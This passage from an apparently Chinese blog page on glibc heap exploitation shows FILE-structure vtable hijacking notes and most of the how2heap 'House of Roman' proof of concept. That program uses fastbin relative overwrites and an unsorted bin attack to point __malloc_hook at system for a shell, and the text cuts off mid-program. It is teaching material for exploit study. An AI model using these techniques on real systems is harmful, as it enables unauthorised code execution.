  <span class="token keyword">char</span> _shortbuf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token comment">/*  char* _save_gptr;  char* _save_egptr; */</span>

  _IO_lock_t <span class="token operator">*</span>_lock<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_IO_USE_OLD_IO_FILE</span></span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_complete</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> _file<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">defined _G_IO_IO_FILE_VERSION <span class="token operator">&amp;&amp;</span> _G_IO_IO_FILE_VERSION <span class="token operator">==</span> <span class="token number">0x20001</span></span></span>
  _IO_off64_t _offset<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">if</span> <span class="token expression">defined _LIBC <span class="token operator">||</span> defined _GLIBCPP_USE_WCHAR_T</span></span>
  <span class="token comment">/* Wide character stream stuff.  */</span>
  <span class="token keyword">struct</span> <span class="token class-name">_IO_codecvt</span> <span class="token operator">*</span>_codecvt<span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">_IO_wide_data</span> <span class="token operator">*</span>_wide_data<span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token operator">*</span>_freeres_list<span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>_freeres_buf<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">else</span></span>
  <span class="token keyword">void</span> <span class="token operator">*</span>__pad1<span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>__pad2<span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>__pad3<span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>__pad4<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">endif</span></span>
  <span class="token class-name">size_t</span> __pad5<span class="token punctuation">;</span>
  <span class="token keyword">int</span> _mode<span class="token punctuation">;</span>       <span class="token comment">//////////////////0xc0</span>
  <span class="token comment">/* Make sure we don't get into trouble again.  */</span>
  <span class="token keyword">char</span> _unused2<span class="token punctuation">[</span><span class="token number">15</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>



<p><strong>_IO_flush_all_lockp函数：</strong></p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">></span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">defined _LIBC <span class="token operator">||</span> defined _GLIBCPP_USE_WCHAR_T</span></span>
	   <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">_IO_vtable_offset</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>
	       <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_mode <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_ptr
				    <span class="token operator">></span> fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
	   <span class="token punctuation">)</span>
	  <span class="token operator">&amp;&amp;</span> <span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
	result <span class="token operator">=</span> <span class="token constant">EOF</span><span class="token punctuation">;</span></code></pre>

<p>成功绕过(fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)&#x3D;&#x3D;》可以到达_IO_OVERFLOW</p>
<p>fp的jump_table的[3]索引设为shell函数地址</p>
<p>最后调用malloc出错，打印错误信息get shell</p>
<pre class="language-c" data-language="c"><code class="language-c">bck <span class="token operator">=</span> victim<span class="token operator">-></span>bk<span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>victim<span class="token operator">-></span>size <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
              <span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>victim<span class="token operator">-></span>size <span class="token operator">></span> av<span class="token operator">-></span>system_mem<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"malloc(): memory corruption"</span><span class="token punctuation">,</span>
                             <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220620100325433.png"></p>
<h3 id="house-of-roman-c"><a href="#house-of-roman-c" class="headerlink" title="house_of_roman.c"></a>house_of_roman.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span>     <span class="token comment">/* for RTLD_NEXT */</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;dlfcn.h></span></span>

<span class="token keyword">char</span><span class="token operator">*</span> shell <span class="token operator">=</span> <span class="token string">"/bin/sh\x00"</span><span class="token punctuation">;</span>

<span class="token comment">/* 
Technique was tested on GLibC 2.23, 2.24 via the glibc_build.sh script inside of how2heap on Ubuntu 16.04. 2.25 was tested on Ubuntu 17.04.

Compile: gcc -fPIE -pie house_of_roman.c -o house_of_roman

POC written by Maxwell Dulin (Strikeout) 
*/</span>

<span class="token comment">// Use this in order to turn off printf buffering (messes with heap alignment)</span>
<span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>

	<span class="token comment">/* 
	The main goal of this technique is to create a **leakless** heap 
	exploitation technique in order to get a shell. This is mainly 
	done using **relative overwrites** in order to get pointers in 
	the proper locations without knowing the exact value of the pointer.

	The first step is to get a pointer inside of __malloc_hook. This 
	is done by creating a fastbin bin that looks like the following: 
	ptr_to_chunk -> ptr_to_libc. Then, we alter the ptr_to_libc
	 (with a relative overwrite) to point to __malloc_hook. 
			
	The next step is to run an unsorted bin attack on the __malloc_hook 
	(which is now controllable from the previous attack).  Again, we run 
	the unsorted_bin attack by altering the chunk->bk with a relative overwrite. 

	Finally, after launching the unsorted_bin attack to put a libc value 
	inside of __malloc_hook, we use another relative overwrite on the 
	value of __malloc_hook to point to a one_gadget, system or some other function.
	
	Now, the next time we run malloc we pop a shell! :) 
	However, this does come at a cost: 12 bits of randomness must be 
	brute forced (0.02% chance) of working.

	The original write up for the *House of Roman* can be found at
	 https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc#assumptions.





	This technique requires the ability to edit fastbin and unsorted bin 
	pointers via UAF or overflow of some kind. Additionally, good control 
	over the allocations sizes and freeing is required for this technique.
	*/</span>

	<span class="token keyword">char</span><span class="token operator">*</span> introduction <span class="token operator">=</span> <span class="token string">"\nWelcome to the House of Roman\n\n"</span>
			     <span class="token string">"This is a heap exploitation technique that is LEAKLESS.\n"</span>
			     <span class="token string">"There are three stages to the attack: \n\n"</span>
			     <span class="token string">"1. Point a fastbin chunk to __malloc_hook.\n"</span>
			     <span class="token string">"2. Run the unsorted_bin attack on __malloc_hook.\n"</span>
			     <span class="token string">"3. Relative overwrite on main_arena at __malloc_hook.\n\n"</span>
			     <span class="token string">"All of the stuff mentioned above is done using two main concepts:\n"</span>
                             <span class="token string">"relative overwrites and heap feng shui.\n\n"</span>
			     <span class="token string">"However, this technique comes at a cost:\n"</span>
                             <span class="token string">"12-bits of entropy need to be brute forced.\n"</span>
			     <span class="token string">"That means this technique only work 1 out of every 4096 tries or 0.02%.\n"</span>
			     <span class="token string">"**NOTE**: For the purpose of this exploit, we set the random values in order to make this consisient\n\n\n"</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span>introduction<span class="token punctuation">)</span><span class="token punctuation">;</span>	
	<span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


	<span class="token comment">/*	
	Part 1: Fastbin Chunk points to __malloc_hook

	Getting the main_arena in a fastbin chunk ordering is the first step.
	This requires a ton of heap feng shui in order to line this up properly. 
	However, at a glance, it looks like the following:

	First, we need to get a chunk that is in the fastbin with a pointer to
	a heap chunk in the fd. 
	Second, we point this chunk to a pointer to LibC (in another heap chunk). 
	All of the setup below is in order to get the configuration mentioned 
	above setup to perform the relative overwrites. ";


	Getting the pointer to libC can be done in two ways: 
			- A split from a chunk in the small/large/unsorted_bins 
				gets allocated to a size of 0x70. 
			- Overwrite the size of a small/large chunk used previously to 0x71.

	For the sake of example, this uses the first option because it 
	requires less vulnerabilities.	
	*/</span>

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Step 1: Point fastbin chunk to __malloc_hook\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Setting up chunks for relative overwrites with heap feng shui.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Use this as the UAF chunk later to edit the heap pointer later to point to the LibC value.	</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> fastbin_victim <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

	<span class="token comment">// Allocate this in order to have good alignment for relative </span>
	<span class="token comment">// offsets later (only want to overwrite a single byte to prevent </span>
	<span class="token comment">// 4 bits of brute on the heap).</span>
	<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Offset 0x100</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> main_arena_use <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token comment">// Offset 0x190</span>
	<span class="token comment">// This ptr will be used for a relative offset on the 'main_arena_use' chunk</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> relative_offset_heap <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token comment">// Free the chunk to put it into the unsorted_bin. </span>
	<span class="token comment">// This chunk will have a pointer to main_arena + 0x68 in both the fd and bk pointers.</span>
	<span class="token function">free</span><span class="token punctuation">(</span>main_arena_use<span class="token punctuation">)</span><span class="token punctuation">;</span>
	

	<span class="token comment">/* 
	Get part of the unsorted_bin chunk (the one that we just freed). 
	We want this chunk because the fd and bk of this chunk will 
	contain main_arena ptrs (used for relative overwrite later).

	The size is particularly set at 0x60 to put this into the 0x70 fastbin later. 

	This has to be the same size because the __malloc_hook fake 
	chunk (used later) uses the fastbin size of 0x7f. There is
	 a security check (within malloc) that the size of the chunk matches the fastbin size.
	*/</span>

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Allocate chunk that has a pointer to LibC main_arena inside of fd ptr.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//Offset 0x100. Has main_arena + 0x68 in fd and bk.</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> fake_libc_chunk <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//// NOTE: This is NOT part of the exploit... \\\
	// The __malloc_hook is calculated in order for the offsets to be found so that this exploit works on a handful of versions of GLibC. </span>
	<span class="token keyword">long</span> <span class="token keyword">long</span> __malloc_hook <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span>fake_libc_chunk<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0xe8</span><span class="token punctuation">;</span>


	<span class="token comment">// We need the filler because the overwrite below needs </span>
	<span class="token comment">// to have a ptr in the fd slot in order to work. </span>
	<span class="token comment">//Freeing this chunk puts a chunk in the fd slot of 'fastbin_victim' to be used later. </span>
	<span class="token function">free</span><span class="token punctuation">(</span>relative_offset_heap<span class="token punctuation">)</span><span class="token punctuation">;</span>	

    	<span class="token comment">/* 
    	Create a UAF on the chunk. Recall that the chunk that fastbin_victim 
	points to is currently at the offset 0x190 (heap_relative_offset).
     	*/</span>
	<span class="token function">free</span><span class="token punctuation">(</span>fastbin_victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/*

	Now, we start doing the relative overwrites, since that we have 
	the pointers in their proper locations. The layout is very important to 
	understand for this.

	Current heap layout: 
	0x0:   fastbin_victim       - size 0x70 
	0x70:  alignment_filler     - size 0x90
	0x100: fake_libc_chunk      - size 0x70
	0x170: leftover_main        - size 0x20
	0x190: relative_offset_heap - size 0x70 

	bin layout: 
			fastbin:  fastbin_victim -> relative_offset_heap
			unsorted: leftover_main
	
	Now, the relative overwriting begins:
	Recall that fastbin_victim points to relative_offset_heap 
	(which is in the 0x100-0x200 offset range). The fastbin uses a singly 
	linked list, with the next chunk in the 'fd' slot.

	By *partially* editing the fastbin_victim's last byte (from 0x90 
	to 0x00) we have moved the fd pointer of fastbin_victim to 
	fake_libc_chunk (at offset 0x100).

	Also, recall that fake_libc_chunk had previously been in the unsorted_bin. 
	Because of this, it has a fd pointer that points to main_arena + 0x68. 

	Now, the fastbin looks like the following: 
	fastbin_victim -> fake_libc_chunk ->(main_arena + 0x68).


	The relative overwrites (mentioned above) will be demonstrates step by step below.
	
	*/</span>


	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\
Overwrite the first byte of a heap chunk in order to point the fastbin chunk\n\
to the chunk with the LibC address\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\
Fastbin 0x70 now looks like this:\n\
heap_addr -> heap_addr2 -> LibC_main_arena\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	fastbin_victim<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span> <span class="token comment">// The location of this is at 0x100. But, we only want to overwrite the first byte. So, we put 0x0 for this.</span>
	

	<span class="token comment">/*
	Now, we have a fastbin that looks like the following: 
			0x70: fastbin_victim -> fake_libc_chunk -> (main_arena + 0x68)
	
	We want the fd ptr in fake_libc_chunk to point to something useful. 
	So, let's edit this to point to the location of the __malloc_hook. 
	This way, we can get control of a function ptr.

	To do this, we need a valid malloc size. Within the __memalign_hook 
	is usually an address that usually starts with 0x7f. 
	Because __memalign_hook value is right before this are all 0s, 
	we could use a misaligned chunk to get this to work as a valid size in 
	the 0x70 fastbin.

	This is where the first 4 bits of randomness come into play. 
	The first 12 bits of the LibC address are deterministic for the address. 
	However, the next 4 (for a total of 2 bytes) are not. 
	
	So, we have to brute force 2^4 different possibilities (16) 
	in order to get this in the correct location. This 'location' 
	is different for each version of GLibC (should be noted).

	After doing this relative overwrite, the fastbin looks like the following:
			0x70: fastbin_victim -> fake_libc_chunk -> (__malloc_hook - 0x23).

	*/</span>
	
	<span class="token comment">/* 
	Relatively overwrite the main_arena pointer to point to a valid 
	chunk close to __malloc_hook.

	///// NOTE: In order to make this exploit consistent 
	(not brute forcing with hardcoded offsets), we MANUALLY set the values. \\\

	In the actual attack, this values would need to be specific 
	to a version and some of the bits would have to be brute forced 
	(depending on the bits).
	*/</span> 

<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\
Use a relative overwrite on the main_arena pointer in the fastbin.\n\
Point this close to __malloc_hook in order to create a fake fastbin chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">long</span> <span class="token keyword">long</span> __malloc_hook_adjust <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">;</span> <span class="token comment">// We substract 0x23 from the malloc because we want to use a 0x7f as a valid fastbin chunk size.</span>

	<span class="token comment">// The relative overwrite</span>
	<span class="token class-name">int8_t</span> byte1 <span class="token operator">=</span> <span class="token punctuation">(</span>__malloc_hook_adjust<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span> 	
	<span class="token class-name">int8_t</span> byte2 <span class="token operator">=</span> <span class="token punctuation">(</span>__malloc_hook_adjust <span class="token operator">&amp;</span> <span class="token number">0xff00</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">;</span> 
	fake_libc_chunk<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> byte1<span class="token punctuation">;</span> <span class="token comment">// Least significant bytes of the address.</span>
	fake_libc_chunk<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> byte2<span class="token punctuation">;</span> <span class="token comment">// The upper most 4 bits of this must be brute forced in a real attack.</span>

	<span class="token comment">// Two filler chunks prior to the __malloc_hook chunk in the fastbin. </span>
	<span class="token comment">// These are fastbin_victim and fake_libc_chunk.</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Get the fake chunk pointing close to __malloc_hook\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\
In a real exploit, this would fail 15/16 times\n\
because of the final half byet of the malloc_hook being random\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
	<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// If the 4 bit brute force did not work, this will crash because </span>
	<span class="token comment">// of the chunk size not matching the bin for the chunk. </span>
	<span class="token comment">// Otherwise, the next step of the attack can begin.</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> malloc_hook_chunk <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Passed step 1 =)\n\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/*
	Part 2: Unsorted_bin attack 

	Now, we have control over the location of the __malloc_hook. 
	However, we do not know the address of LibC still. So, we cannot 
	do much with this attack. In order to pop a shell, we need 
	to get an address at the location of the __malloc_hook.

	We will use the unsorted_bin attack in order to change the value 
	of the __malloc_hook with the address of main_arena + 0x68. 
	For more information on the unsorted_bin attack, review 
	https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c.

	For a brief overview, the unsorted_bin attack allows us to write
	main_arena + 0x68 to any location by altering the chunk->bk of
	an unsorted_bin chunk. We will choose to write this to the 
	location of __malloc_hook.

	After we overwrite __malloc_hook with the main_arena, we will 
	edit the pointer (with a relative overwrite) to point to a 
	one_gadget for immediate code execution.
			
	Again, this relative overwrite works well but requires an additional 
	1 byte (8 bits) of brute force.
	This brings the chances of a successful attempt up to 12 bits of 
	randomness. This has about a 1/4096 or a 0.0244% chance of working.

	
	The steps for phase two of the attack are explained as we go below.
	*/</span>

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\
Start Step 2: Unsorted_bin attack\n\n\
The unsorted bin attack gives us the ability to write a\n\
large value to ANY location. But, we do not control the value\n\
This value is always main_arena + 0x68. \n\
We point the unsorted_bin attack to __malloc_hook for a \n\
relative overwrite later.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


	<span class="token comment">// Get the chunk to corrupt. Add another ptr in order to prevent consolidation upon freeing.</span>
	
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> unsorted_bin_ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
	<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Don't want to consolidate</span>

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Put chunk into unsorted_bin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// Free the chunk to create the UAF</span>
	<span class="token function">free</span><span class="token punctuation">(</span>unsorted_bin_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* /// NOTE: The last 4 bits of byte2 would have been brute forced earlier. \\\ 
	 However, for the sake of example, this has been calculated dynamically. 
	*/</span>
	__malloc_hook_adjust <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">;</span> <span class="token comment">// This subtract 0x10 is needed because of the chunk->fd doing the actual overwrite on the unsorted_bin attack.</span>
	byte1 <span class="token operator">=</span> <span class="token punctuation">(</span>__malloc_hook_adjust<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span> 	
	byte2 <span class="token operator">=</span> <span class="token punctuation">(</span>__malloc_hook_adjust <span class="token operator">&amp;</span> <span class="token number">0xff00</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">;</span> 


	<span class="token comment">// Use another relative offset to overwrite the ptr of the chunk->bk pointer.</span>
	<span class="token comment">// From the previous brute force (4 bits from before) we </span>
	<span class="token comment">// know where the location of this is at. It is 5 bytes away from __malloc_hook.</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Overwrite last two bytes of the chunk to point to __malloc_hook\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	unsorted_bin_ptr<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> byte1<span class="token punctuation">;</span> <span class="token comment">// Byte 0 of bk. 	</span>

	<span class="token comment">// //// NOTE: Normally, the second half of the byte would HAVE to be brute forced. However, for the sake of example, we set this in order to make the exploit consistent. ///</span>
	unsorted_bin_ptr<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> byte2<span class="token punctuation">;</span> <span class="token comment">// Byte 1 of bk. The second 4 bits of this was brute forced earlier, the first 4 bits are static.</span>
	
	<span class="token comment">/* 
	Trigger the unsorted bin attack.
	This will write the value of (main_arena + 0x68) to whatever is in the bk ptr + 0x10.

	A few things do happen though: 
		- This makes the unsorted bin (hence, small and large too) 
		   unusable. So, only allocations previously in the fastbin can only be used now.
		- If the same size chunk (the unsorted_bin attack chunk) 
		   is NOT malloc'ed, the program will crash immediately afterwards. 
		   So, the allocation request must be the same as the unsorted_bin chunk.


	The first point is totally fine (in this attack). But, in more complicated 
	programming, this can be an issue.
	The second just requires us to do the same size allocaton as the current chunk.

	*/</span>

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Trigger the unsorted_bin attack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Trigger the unsorted_bin attack to overwrite __malloc_hook with main_arena + 0x68</span>

	<span class="token keyword">long</span> <span class="token keyword">long</span> system_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token function">dlsym</span><span class="token punctuation">(</span>RTLD_NEXT<span class="token punctuation">,</span> <span class="token string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Passed step 2 =)\n\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">/* 
	Step 3: Set __malloc_hook to system
	
	The chunk itself is allocated 19 bytes away from __malloc_hook. 
	So, we use a realtive overwrite (again) in order to partially overwrite 
	the main_arena pointer (from unsorted_bin attack) to point to system.

	In a real attack, the first 12 bits are static (per version). 
	But, after that, the next 12 bits must be brute forced. 

	/// NOTE: For the sake of example, we will be setting these values, instead of brute forcing them. \\\
	*/</span> 

	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Step 3: Set __malloc_hook to system/one_gadget\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\
Now that we have a pointer to LibC inside of __malloc_hook (from step 2), \n\
we can use a relative overwrite to point this to system or a one_gadget.\n\
Note: In a real attack, this would be where the last 8 bits of brute forcing\n\
comes from.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	malloc_hook_chunk<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> system_addr <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span> <span class="token comment">// The first 12 bits are static (per version).</span>

	malloc_hook_chunk<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>system_addr <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>  <span class="token comment">// The last 4 bits of this must be brute forced (done previously already).</span>
	malloc_hook_chunk<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>system_addr <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>  <span class="token comment">// The last byte is the remaining 8 bits that must be brute forced.</span>
	malloc_hook_chunk<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>system_addr <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span> <span class="token comment">// If the gap is between the data and text section is super wide, this is also needed. Just putting this in to be safe.</span>


